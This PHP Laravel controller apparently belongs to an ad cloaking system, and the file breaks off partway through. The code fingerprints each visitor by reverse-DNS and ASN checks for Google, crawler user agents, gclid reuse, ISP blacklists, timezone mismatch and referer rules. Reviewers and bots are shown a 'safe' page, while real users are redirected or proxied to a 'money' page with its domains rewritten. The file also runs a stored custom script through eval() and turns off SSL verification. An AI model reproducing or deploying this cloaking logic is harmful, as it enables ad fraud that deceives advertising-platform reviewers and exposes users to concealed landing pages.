<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use GeoIp2\Database\Reader;
use App\Ips;
use App\Isps;
use App\Links;
use App\Domains;
use App\ScrapedPages;
use Session;
use Carbon\Carbon;
use Redirect;
use Cookie;
use Monolog\Logger;
use Monolog\Handler\StreamHandler;
use App\Ipsv6;
use App\UniqueGclids;
use App\Stats;
use App\Referer;

class SnapAppController extends Controller
{
    //

    public $request;
    protected $link;
    protected $ispreader;
    protected $countryreader;
    protected $cityreader;
    protected $botuseragentsdata;
    protected $ip;
    protected $isp;
    protected $country;
    protected $blocked;
    protected $reason;
    protected $is_link;
    protected $is_ipv6;
    protected $cdns_prefix;
    protected $is_tz_check;
    protected $organization;

    public function __construct(){
        $this->reason = array();
        $this->is_link = false;
        $this->middleware('web');
        $this->is_ipv6 = false;
        $this->getuserip();
        $this->blocked = 0;
        $this->is_tz_check = false;
        $this->cdns_prefix = ['cdn', 'media', 'amp', 'images', 'image', 'statics', 'static', 'icdn2', 'uw-media', 'cdn1.img', 'cdn2.img','ssp'];
    }

    public function test(Request $request){
    }

    public function direct($link, Request $request){
        $data = $this->render($request);
        return response()->view('content', $data, 200)
        ->header('Content-Type', $data['type']);
    }
    public function root(Request $request){
         $data = $this->render($request);
            return response()->view('content', $data, 200)
            ->header('Content-Type', $data['type']);
    }

    public function render($request){
        $this->request = $request;
        $this->getLink();
        if(empty($this->link)){
            $this->abort();
        }
        if($this->is_link){

            if( !($this->request->isMethod('post') && $this->request->has('o')) && ($this->isClickBlocked() || $this->isRefererBlocked() || $this->isNotMobile() || $this->isBlockedByFirewall() || $this->isCountriesBlocked() || $this->isBlockedNonexistentReferral() || $this->isBlockedReferral() || $this->isnonexistentGclid() || $this->isuniqueexistentGclid())){
                if($this->isActiveField('loglink') && $this->getValue('loglink')){
                    $this->loglink(true);
                }

                /*If we get inside in this section that means block status is 1 and 1 means redirect to safe page*/
                $this->isSafeUnsafeStatus();
                return $this->loadContent();

            }else{
              $check_failed = false;
              if($this->isTimeZoneBlocked()){
                $check_failed = true;
                $this->is_tz_check = true;
              }
                //$this->reason("custom script execution");
                if($this->isActiveField('loglink') && $this->getValue('loglink')){
                    $this->loglink(true);
                }
                /*If we get inside in this section that means block status is 0 and 0 means redirect to unsafe page*/
                $this->isSafeUnsafeStatus();
                if(!$check_failed){
                  $this->loadcustomscript();
                }

                return $this->loadContent();
            }
        }else{
            $this->loglink(false);
            if($this->isActiveField('loglink') && $this->getValue('loglink')){
                $this->loglink(true);
            }
            $data = $this->loadAssets();
            if($data['httpcode'] === 200){
                header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
                header("Cache-Control: post-check=0, pre-check=0", false);
                header("Pragma: no-cache");
                header("Content-Type: ".$data['type']);
                echo $data['response'];
            }else{
                $this->abort($data['httpcode']);
            }
            exit;
        }
    }

    public function loadContent(){
        if($this->blocked){
            if($this->isActiveField('proxified_original') && $this->getValue('proxified_original')){
                return $this->proxiedContent($this->link->safe_link);
            }else{
                $this->deleteSessionLink();
                return $this->redirect($this->link->safe_link);
            }
        }else{
            if($this->isActiveField('landing_page')){
                $path = $this->generateResourcePath();
                return $this->loadofflinepage($path);
            }elseif($this->isActiveField('proxified_money') && $this->getValue('proxified_money')){
                return $this->proxiedContent($this->link->money_link);
            }else{
                $this->deleteSessionLink();
                return $this->redirect($this->link->money_link);
            }
        }
    }

    public function loadAssets(){
        if($this->blocked){
            if($this->isActiveField('proxified_original')){
                if($this->getValue('proxified_original')){
                    $url = $this->regenerateOriginalurl();
                    return $this->proxiedContent($url);
                }
            }
        }else{
            if($this->isActiveField('landing_page')){
                $path = $this->generateResourcePath();
                return $this->loadofflinepage($path);
            }elseif($this->isActiveField('proxified_money')){
                if($this->getValue('proxified_money')){
                    $url = $this->regenerateOriginalurl();
                    return $this->proxiedContent($url);
                }
            }
        }
    }

    public function getLink(){
        $_domain = explode("//",$this->request->root())[1];
        $_slug = ltrim($this->request->path(),"/");
        $domain = Domains::wheredomain($this->getDomain($_domain))->first();
        if(empty($domain) || empty(Links::wheredomain_id($domain->id)->first())){
            $this->abort();
        }

        $this->logdomain($domain);
        $link = Links::wheredomain_id($domain->id)->whereslug(rtrim($_slug, "/"))->first();
        if(!empty($link)){
            $this->is_link = true;
            $link = Links::wheredomain_id($domain->id)->whereslug(rtrim($_slug, "/"))->first(); // Recall Link to avoid click limit errors
            $this->link = $link;
            $this->setClick();
        }

        $this->sessionManger();
        if(empty($this->link)){
            $this->abort();
        }
    }

    public function sessionManger(){
        if($this->is_link){
            Session::put('link', json_encode($this->link));
            Session::put('is_blocked', $this->blocked);
            Session::save();
        }else{
            $link = Session::get('link');
            if(!empty($link)){
                $this->link = Links::whereid(json_decode($link)->id)->first();
                $this->blocked(Session::get('is_blocked'));
            }
        }
    }

    public function deleteSessionLink(){
        $link = Session::get('link');
        if(!empty($link)){
            Session::put('link', null);
            Session::save();
        }
    }

    public function reviewip(){
        if(!$this->is_ipv6){
            $this->addIPagainstCamp($this->ip);
        }
    }

    public function addIPagainstCamp($ip){
        $longip = bindec(decbin(ip2long($ip)));
        $ip = Ips::where('start', '>=', $longip)->where('end', '<=', $longip)->first();
        if(empty($ip)){
            $ip = new Ips;
            $ip->start = $longip;
            $ip->end = $longip;
            $ip->repetition = 0;
        }
        $ip->save();
        $piv = $ip->campaigns()->withPivot("clicks")->find($this->link->id);
        if(empty($piv)){
            $ip->campaigns()->attach($this->link->id);
            $piv = $ip->campaigns()->withPivot("clicks")->find($this->link->id);
        }
        $ip->campaigns()->updateExistingPivot($this->link->id, ["clicks" => ($piv->pivot->clicks+1)]);
        return;
    }

    public function isTimeZoneBlocked(){
        if($this->isActiveField('timezone_check') && $this->getValue('timezone_check')){
            if($this->request->isMethod('post') && $this->request->has('o')){
                $this->cityreader = new Reader(base_path()."/firewall/geoipdb/GeoLite2-City.mmdb");
                $requestoffset = $this->request->get('o');
                try{
                    $citydata = $this->cityreader->city($this->requestip());
                    $timezone = $citydata->location->timeZone;
                    $offset = Carbon::now($timezone)->offsetHours;
                    $ipoffset = $offset*-60;
                }
                catch(\Exception $e){
                    $ipoffset = $requestoffset;
                }
                if($ipoffset != $requestoffset){
                    $this->blocked(1);
                    $this->reviewip();
                    $this->reason('timezone_check');
                    return true;
                }
            }else{
                echo '<body onload="post()">
                        <form method="POST" action="" name="form">
                        <input id="o" type="hidden" name="o" value="0">
                        </form>
                        <script>
                            function post(){
                                var o = document.getElementById("o");
                                var d = new Date();
                                o.value = d.getTimezoneOffset();
                                document.form.submit();
                            }
                        </script>
                    </body>';
                exit();
            }
        }
    }


    public function checkTimeStamp($oldTimestamp)
    {
        $oldTimestamp;
        $startTime = $oldTimestamp-120;
        $endTime = $oldTimestamp+120;
        $utc_str = gmdate("M d Y H:i:s", time()); $utc = strtotime($utc_str);
        if(($utc>=$startTime) && ($utc<=$endTime)){
            return false;
        }
        $this->blocked(1);
        $this->reason('Timestamp mismatch');
        return true;
    }


    public function getHtmlForm()
    {
    return view('admin.components.gettimezone')->render();
    }
    public function isClickBlocked(){
        if($this->isActiveField('click_limit')){
            if($this->link->clicks < $this->getinlineValue('click_limit', $this->link->click_limit)){
                $this->blocked(1);
                $this->reason('clicklimit');
                return true;
            }
        }
        return false;
    }

    public function loadcustomscript(){
        if($this->isActiveField('custom_script')){
            $script = $this->getValue('custom_script');
             //$this->reason("customscript");
             $this->reason("custom script execution");
            $_SERVER["REMOTE_ADDR"] = $this->requestip();
            eval($script);
            // if (($key = array_search("customscript", $this->reason)) !== false) {
                // unset($this->reason[$key]);
            // }
        }
    }

    public function proxiedContent($url){
        // incomplete
        $response = $this->loadviaproxy($url);
        if($this->is_link && ($response['httpcode'] !== 200 || empty($response['response']))){
            $_response = $this->getScraped();
            if(!empty($_response)){
                $response = $_response;
            }
        }
        if(!is_string ($response['response'])){
            $response['response'] = "";
        }

        $response['response'] = $this->polishdata($response['response']);
        return $response;
    }

    public function loadofflinepage($path){
        $is_dir  = is_dir($path);
        if($is_dir){
            $path = $path."index.php";
        }
        $is_dir  = is_dir($path);
        $file_exists = file_exists($path);
        if($file_exists && !$is_dir){
            $content_type = mime_content_type($path);
            $content = file_get_contents($path);
            if(strtolower(explode(".", $path)[count(explode(".", $path)) - 1]) == "css"){
                $content_type = "text/css";
            }
            if(strtolower(explode(".", $path)[count(explode(".", $path)) - 1]) == "js"){
                $content_type = "application/javascript";
                $content = str_replace("{offer_url}", $this->link->money_link, $content);
            }
            if($content_type == "text/plain" || $content_type == "text/html"){
                $content = str_replace("{offer_url}", $this->link->money_link, $content);
            }
            $response['type'] = $content_type;
            $response['response'] = $content;
            $response['httpcode'] = 200;
        }else{
            $response['type'] = "text/html";
            $response['content'] = "";
            $response['httpcode'] = 404;
        }
        return $response;
    }

    public function loadviaproxy($url){
        if(empty(explode("?", $url)[1])){
            $params = "?";
        }else{
            $params = "&";
            $url = explode("#", $url)[0];
        }
        foreach($this->request->query->all() as $key => $value){
            if(!empty($key)){
                $params .= $key.'='.$value.'&';
            }
        }
        $url = $url.rtrim($params, '&');
        $url = rtrim($url, '?');
        $curl = curl_init();
        if (!$this->is_tz_check && strtoupper($this->request->getMethod()) == "POST"){
            curl_setopt($curl, CURLOPT_POST, 1);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $this->request->request->all());
        }
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_FAILONERROR, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_MAXREDIRS, 10);
        curl_setopt($curl, CURLOPT_TIMEOUT, 15);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_USERAGENT, $this->request->userAgent());
        $response = curl_exec($curl);
        $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE);
        $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);
        return ['httpcode' => $httpcode, 'response' => $response, "type" => $type];
    }

    public function redirect($url){
        if(!$this->blocked && $this->isActiveField('spoof_referral') && $this->getValue('spoof_referral')){
            echo '
            <body onload="document.form.submit()">
                <form method="POST" action="'.route('redirector').'" name="form">
                    <input type="hidden" name="out" value="'.$this->link->id.'">
                    <input type="hidden" name="type" value="u">
                </form>
            </body>
            ';
            exit();
        }
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        header("Cache-Control: post-check=0, pre-check=0", false);
        header("Pragma: no-cache");
        header("Location: ".$url);
        exit();
    }

    public function redirector(Request $request){
        $link = Links::whereid($request->get('out', 0))->first();
        if(!empty($link)){
            $this->link = $link;
        }
        if(!empty($link) && $request->get('type', 's') == "u"){
            $url = $link->money_link;
        }
        if(!empty($link)){
            $url = $link->safe_link;
        }
        if(!empty($url)){
            header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
            header("Cache-Control: post-check=0, pre-check=0", false);
            header("Pragma: no-cache");
            header("Location: ".$url);
        }
        exit();
    }

    public function isNotMobile(){
        if($this->isActiveField('mobile_only')){
            if($this->getValue('mobile_only')){
                if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$this->request->userAgent())||preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($this->request->userAgent(),0,4))){
                }else{
                    $this->blocked(1);
                    $this->reason('mobileonly');
                    return true;
                }
            }
        }
        return false;
    }

    public function isBlockedByFirewall(){
        if($this->isActiveField('enable_firewall') && $this->getValue('enable_firewall')){
            $this->fetchgeoipdata();
            if($this->isBlockedISP() || $this->isBlockedIP() || $this->isBlockedIPv6() || $this->isBlockedUserAgent() || $this->isBlockedHost()){
                $this->blocked(1);
                $this->reason('BlockedbyFirewall');
                return true;
            }
        }
        return false;
    }

    public function isRefererBlocked(){
        if($this->isActiveField('referer_firewall') && $this->getValue('referer_firewall')){
            $referer = "";
            if(!empty($this->request->headers->get('referer'))){
                $referer = $this->request->headers->get('referer');
            }
            if(empty($referer)){
                $this->blocked(1);
                $this->reason('Empty Referer');
                return true;
            }
            $parsed = parse_url($referer);
            if(empty($parsed['host'])){
                $this->blocked(1);
                $this->reason('Invalid Referer');
                return true;
            }
            $host = strtolower(preg_replace('/^www./', '', $parsed['host']));
            $ref = Referer::wherereferer($host)->first();
            if(empty($ref)){
                $ref = new Referer;
                $ref->referer = $host;
                $ref->save();
            }
            if(!empty(Referer::wherereferer($host)->whereisreviewed(1)->whereisblocked(1)->first()) || !empty(Referer::wherereferer($host)->whereisreviewed(0)->whereisblocked(0)->first())){
                $this->blocked(1);
                $this->reason('Referer Firewall');
                return true;
            }
        }
        return false;
    }

    public function isBlockedHost(){
        if(strpos(strtolower(gethostbyaddr($this->requestip())),"google") !== false ){
            $this->blocked(1);
            $this->reason('hostBlocked');
            return true;
        }
        return false;
    }

    public function isCountriesBlocked(){
        $this->fetchgeoipdata();
        if($this->isActiveField('countries_list')){
            $countries_list = $this->getValue('countries_list');
            if($this->isActiveField('is_countries_blocked')){
                $is_blocked = $this->getValue('is_countries_blocked');
            }else{
                $is_blocked = 0;
            }
            if(!empty($countries_list)){
                $countries = explode(",", trim(rtrim(strtolower($countries_list),",")));
                if(!(in_array(strtolower($this->country), $countries) xor $is_blocked)){
                    $this->blocked(1);
                    $this->reason('blockedcountry');
                    return true;
                }
            }
        }
        return false;
    }

    public function isBlockedNonexistentReferral(){
        if($this->isActiveField('referral_exists')){
            if($this->getValue('referral_exists')){
                if(empty($this->request->headers->get('referer'))){
                    $this->blocked(1);
                    $this->reason('referral_exists');
                    return true;
                }
            }
        }
        return false;
    }

    public function isBlockedIPv6(){
        if($this->isActiveField('blockipv6') && $this->getValue('blockipv6')){
            if($this->is_ipv6){
                $this->blocked(1);
                $this->reason("IPv6");
                return true;
            }
        }
        return false;
    }

    public function isBlockedReferral(){
        if($this->isActiveField('filter_referral')){
            $ref = $this->request->headers->get('referer');
            $valid_referrals = $this->getValue('filter_referral');
            if(empty($ref)){
                $this->blocked(1);
                $this->reason('emptyreferral');
                return true;
            }
            foreach(explode(",", $valid_referrals) as $valid_referral){
                if (strpos(strtolower($ref), strtolower($valid_referral)) !== false) {
                    return false;
                }
            }
            $this->blocked(1);
            $this->reason('referralfilter');
            return true;
        }
    }

    public function isnonexistentGclid(){
        if($this->isActiveField('gclid_exists')){
            if($this->getValue('gclid_exists')){
                if(!$this->request->has('gclid')){
                    $this->blocked(1);
                    $this->reason('gclid');
                    return true;
                }
            }
        }
        return false;
    }

    /* Check whether unique gclid is enabled or not begin code dated: 22 feb 2019 */

    public function isuniqueexistentGclid(){
        $uniqueGclids = new UniqueGclids();
        $uniqueGclids->gclid = $this->request->gclid;

        if($this->request->has('gclid')){
            $is_unique_or_not =  UniqueGclids::where('gclid',$this->request->gclid)->count();
            if(!$is_unique_or_not)
                $uniqueGclids->save();
        }
            if($this->isActiveField('unique_gclid_exists')){
                if($this->getValue('unique_gclid_exists')){
                    
                    if(strlen($this->request->gclid) < 30 || strpos($this->request->gclid, "_") === false){
                        $this->blocked(1);
                        $this->reason('Gcl Id is already Exist _');
                        return true;
                    }
                    if(!$this->request->has('gclid') || empty($this->request->gclid)){
                        $this->blocked(1);
                        $this->reason('Gcl Id is not exist in Url');
                        return true;
                    }elseif($is_unique_or_not){
                        $this->blocked(1);
                        $this->reason('Gcl Id is already Exist');
                        return true;
                    }else{
                     return false;
                    }
                }
            }
            return false;
    }

    /* Check whether unique gclid is enabled or not end code dated: 22 feb 2019 */


    public function isBlockedIP(){
        if($this->is_ipv6){
            $cutshortipv6 = $this->get_trimmed_ipv6($this->requestip());
            $this->recordipv6($cutshortipv6);
            if(!empty(Ipsv6::where('updated_at', '>', Carbon::now()->subHours(2)->toDateTimeString())->where('ip', $cutshortipv6)->first()) && Ipsv6::where('updated_at', '>', Carbon::now()->subHours(2)->toDateTimeString())->where('ip', $cutshortipv6)->first()->repetition > 1){
                $this->blocked(1);
                $this->reason('ipv6block');
                return true;
            }
        }else{
            $longip = bindec(decbin(ip2long($this->requestip())));
            $this->recordip($longip);
            {
                $csize = 42949673;
                $ip_fno = ceil($longip/$csize);
                if($ip_fno == 0){
                    $ip_fno = 1;
                }
                $ipfilerange = base_path()."/firewall/ips/data/ip$ip_fno.csv";
                $fileName = $ipfilerange;
                $file = fopen($fileName,'r');
                while(!feof($file)) {
                    $line = fgets($file);
                    $line_data = str_getcsv($line);
                    if(isset($line_data[0]) && isset($line_data[1]) && $line_data[0] <= $longip && $line_data[1] >= $longip){
                        $this->blocked(1);
                        if(is_string($line_data[2])){
                            $this->reason($line_data[2]);
                        }else{
                            $this->reason('{"Unknown Line"}');
                        }
                        return true;
                    }

                }
            }
            if(!empty(Ips::whereis_permanent(1)->where('start', '>=', $longip)->where('end', '<=', $longip)->first())){
                $this->blocked(1);
                $this->reason('permanentipblock');
                return true;
            }
            if(!empty(Ips::whereis_permanent(0)->where('updated_at', '>', Carbon::now()->subHours(2)->toDateTimeString())->where('start', '>=', $longip)->where('end', '<=', $longip)->first()) && Ips::whereis_permanent(0)->where('updated_at', '>', Carbon::now()->subHours(2)->toDateTimeString())->where('start', '>=', $longip)->where('end', '<=', $longip)->first()->repetition > 1){
                $this->blocked(1);
                $this->reason('temporaryipblock');
                return true;
            }
        }
        return false;
    }

    public function isBlockedISP(){
        if($this->isActiveField('bypass_whitelisted_isp') && $this->getValue('bypass_whitelisted_isp')){
            if(!empty(Isps::whereisp($this->isp)->whereisblocked(0)->whereisreviewed(1)->first())){
                return false;
            }
        }
        if(!empty(Isps::whereisp($this->isp)->first())){
            $this->blocked(1);
            $this->reason('blacklistedisp');
            return true;
        }
        return false;
    }

    public function isBlockedASN(){
        if(strpos(strtolower($this->ASO), 'google') !== false){
            return false;
        }
        $this->blocked(1);
        $this->reason('Blocked ASO');
        return true;
    }

    public function isBlockedUserAgent(){
        $this->loadbotuseragentsdata();
        if(empty($this->request->userAgent())){
            return false;
        }

        $patterns = array();
        foreach($this->botuseragentsdata as $entry) {
            $patterns[] = $entry['pattern'];
        }
        $useragent = $this->request->userAgent();
        foreach($patterns as $pattern){
            if(strpos($useragent, $pattern) !== false){
                $this->blocked(1);
                $this->reason('blockeduseragent');
                return true;
            }
        }
        return false;
    }

    public function getScraped(){
        $page = ScrapedPages::wherelink_id($this->link->id)->first();
        if(!empty($page)){
            return json_decode($page->content, true);
        }
        $this->reason('noscrapedata');
        return false;
    }

    public function setClick(){
        $this->link->clicks++;
        $this->link->save();
    }
    public function isSafeUnsafeStatus(){
        $StatsGclids = new Stats;
        $StatsGclids->is_safe = $this->blocked;
        //echo $this->link->id; echo '<br>';
        //echo $this->link->updatedby->companyname->id;

      //  die();
        $StatsGclids->link_id = $this->link->id;
        $StatsGclids->user_id     = $this->link->updatedby->id;
        $StatsGclids->company_id  = $this->link->updatedby->companyname->id;
        $StatsGclids->save();
    }

    public function isActiveField($key){
        if(!empty($this->link->section->settings->where('field', $key)->first())){
            return true;
        }
        return false;
    }

    public function getinlineValue($key, $default){
        if($this->link->section->settings->where('field', $key)->first()->is_hidden){
            return $this->link->section->settings->where('field', $key)->first()->default;
        }
        return $default ?? $this->link->section->settings->where('field', $key)->first()->default;
    }

    public function getValue($key){
        if($this->link->section->settings->where('field', $key)->first()->is_hidden){
            return $this->link->section->settings->where('field', $key)->first()->default;
        }
        return $this->link->settings->where('setting_name', $key)->first()->value ?? $this->link->section->settings->where('field', $key)->first()->default;
    }

    public function reason($reason){
        $this->reason[] = $reason;
    }

    public function fetchgeoipdata(){
        $this->ispreader = new Reader(base_path()."/firewall/geoipdb/GeoIP2-ISP.mmdb");
        $this->countryreader = new Reader(base_path()."/firewall/geoipdb/GeoIP2-Country.mmdb");
        try{
            $ispdata = $this->ispreader->isp($this->requestip());
            $this->isp = $ispdata->isp;
            $this->organization = $ispdata->organization;
        }
        catch(\Exception $e){
            if(empty($this->isp)){
                $this->isp = "Unknown";
            }
            $this->organization = "-";
        }
        try{
            $countrydata = $this->countryreader->country($this->requestip());
            $this->country = strtolower($countrydata->country->isoCode);
        }
        catch(\Exception $e){
            //$this->country = "IN";
            $this->country = "ZZ"; //ZZ is replaced by IN on 28 feb 2019
        }
    }

    public function getuserip(){
        $this->ip = $this->requestip();
    }

    public function recordip($longip){
        $ip = Ips::where('start', '>=', $longip)->where('end', '<=', $longip)->first();
        if(empty($ip)){
            $ip = new Ips;
            $ip->start = $longip;
            $ip->end = $longip;
            $ip->repetition = 0;
        }
        if(!empty($this->organization)){
            $ip->organization = $this->organization;
        }
        if(!empty($this->isp)){
            $ip->isp = $this->isp;
        }
        $ip->repetition++;
        $ip->save();
    }

    public function recordipv6($cip){
        $ip = Ipsv6::where('ip', $cip)->first();
        if(empty($ip)){
            $ip = new Ipsv6;
            $ip->ip = $cip;
            $ip->repetition = 0;
        }
        if(!empty($this->organization)){
            $ip->organization = $this->organization;
        }
        if(!empty($this->isp)){
            $ip->isp = $this->isp;
        }
        $ip->repetition++;
        $ip->save();
    }

    public function loadbotuseragentsdata(){
        $this->botuseragentsdata = json_decode(file_get_contents(base_path().'/firewall/crawler/crawler-user-agents.json'), true);
    }

    public function getDomain(){
        $domain = $this->removeFromBeg(explode("//",$this->request->root())[1], "www.");
        return $domain;
    }

    private function removeFromBeg($haystack, $needle){
        $length = strlen($needle);
        if($needle.substr($haystack, $length) === $haystack)
        {
            $haystack = substr($haystack, $length);
        }
        return $haystack;
    }

    public function getSubDomain(){
        // incomplete
    }

    public function polishdata($data){

        if($this->blocked){
            $domain = parse_url($this->link->safe_link, PHP_URL_HOST);
            $data = str_replace($domain, $this->link->domain->domain, $data);
            $data = str_replace($this->removeFromBeg($domain, "www."), $this->link->domain->domain, $data);

            foreach($this->cdns_prefix as $pre){
                $data = str_replace($pre.".".$this->link->domain->domain, $pre.".".$this->removeFromBeg($domain, "www."), $data);
            }

            if(parse_url($this->link->safe_link, PHP_URL_PATH)!='/'){
                $data = str_replace(parse_url($this->link->safe_link, PHP_URL_PATH), $this->link->slug, $data);
             }
            //$data = str_replace(parse_url($this->link->safe_link, PHP_URL_PATH), $this->link->slug, $data); ///this code is comment on 27 feb 2019 because we are getting blank data;
        }else{
            $domain = parse_url($this->link->money_link, PHP_URL_HOST);
            $data = str_replace($domain, $this->link->domain->domain, $data);

             if(parse_url($this->link->money_link, PHP_URL_PATH)!='/'){
                $data = str_replace(parse_url($this->link->money_link, PHP_URL_PATH), $this->link->slug, $data);
             }
            //$data = str_replace(parse_url($this->link->money_link, PHP_URL_PATH), $this->link->slug, $data);
            //echo '<pre>'; echo $domain;print_r($data); echo '</pre>'; die();

        }
        return $data;
    }

    public function generateResourcePath(){
        if($this->is_link){
            $path = base_path()."/landingpages/".$this->link->landingpage."/index.php";
        }else{
            $path = base_path()."/landingpages/".$this->link->landingpage."/".ltrim($this->request->path(), "/");
        }
        return $path;
    }

    public function regenerateOriginalurl(){
        if($this->blocked){
            $url = parse_url($this->link->safe_link, PHP_URL_SCHEME)."://".parse_url($this->link->safe_link, PHP_URL_HOST);
            if($this->removeFromBeg(trim($this->request->path(), "/"), $this->link->slug) != $this->request->path() && !empty(trim($this->request->path(), "/"))){
                $slug = trim(parse_url($this->link->safe_link, PHP_URL_PATH), "/")."/" . $this->removeFromBeg(ltrim($this->request->path(), "/"), $this->link->slug);
            }else{
                $slug = ltrim($this->request->path(), "/");
            }
            $url = $url."/".$slug;
        }else{
            $url = parse_url($this->link->money_link, PHP_URL_SCHEME)."://".parse_url($this->link->money_link, PHP_URL_HOST);
            if($this->removeFromBeg(trim($this->request->path(), "/"), $this->link->slug) != $this->request->path() && !empty(trim($this->request->path(), "/"))){
                $slug = trim(parse_url($this->link->money_link, PHP_URL_PATH), "/") . $this->removeFromBeg(ltrim($this->request->path(), "/"), $this->link->slug);
            }else{
                $slug = ltrim($this->request->path(), "/");
            }
            $url = $url."/".$slug;
        }
        return $url;
    }

    public function logdomain($domain){
        $log = [
            'IP' => $this->requestip(), 
            'Method' => $this->request->getMethod(), 
            'Path' => $this->request->path(), 
            'Query' => $this->request->all(), 
            "UserAgent" => $this->request->userAgent(),
            "Referer" => $this->request->headers->get('referer') ?? "",
            "Headers" => $this->request->headers->all()
        ];
        $ReportsLog = new Logger($domain->domain);
        $ReportsLog->pushHandler(new StreamHandler(storage_path('logs/domains/'.$domain->domain.date('-Y-m-d').'.log')), Logger::INFO);
        $ReportsLog->info($domain->domain, $log);
        return;
    }

    public function loglink($main = false){
        if(empty($this->link)){
            return;
        }
        if($this->isActiveField("loglink") && $this->getValue("loglink")){
          if($main){
              $log = [
                  'Type'=> "Main", 
                  "Status" => $this->blocked ? "Blocked" : "Passed", 
                  "Reason" => $this->reason, 
                  'IP' => $this->requestip(), 
                  'Method' => $this->request->getMethod(), 
                  'Path' => $this->request->path(), 
                  'Query' => $this->request->all(), 
                  "UserAgent" => $this->request->userAgent(),
                  "Referer" => $this->request->headers->get('referer') ?? "",
                  "Headers" => $this->request->headers->all()
                ];
          }else{
              $log = [
                  'Type'=> "Asset", 
                  "Status" => $this->blocked ? "Blocked" : "Passed", 
                  'IP' => $this->requestip(), 
                  'Method' => $this->request->getMethod(), 
                  'Path' => $this->request->path(), 
                  'Query' => $this->request->all(), 
                  "UserAgent" => $this->request->userAgent(),
                  "Referer" => $this->request->headers->get('referer') ?? "",
                  "Headers" => $this->request->headers->all()
                ];
          }
            $ReportsLog = new Logger($this->link->id);
            $ReportsLog->pushHandler(new StreamHandler(storage_path('logs/links/link'.$this->link->id.date('-Y-m-d').'.log')), Logger::INFO);
            $ReportsLog->info($this->link->id, $log);
        }
        return;
    }

    public function blocked($status = 0){
        $this->blocked = $status;
        Session::put('is_blocked', $this->blocked);
        Session::save();
    }

    public function requestip(){

        /*
        $indiaCaseIp = '103.72.143.56';
        $indiaCaseIp = '45.32.4.87';
        return $indiaCaseIp;
        */

        $ip_keys = array('HTTP_CF_CONNECTING_IP','HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
        foreach ($ip_keys as $key) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$key]) as $ip) {
                    $ip = trim($ip);
                    if ($this->validate_ip($ip)) {
                        return $ip;
                    }
                }
            }
        }
        return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
    }


    public function validate_ip($ip){
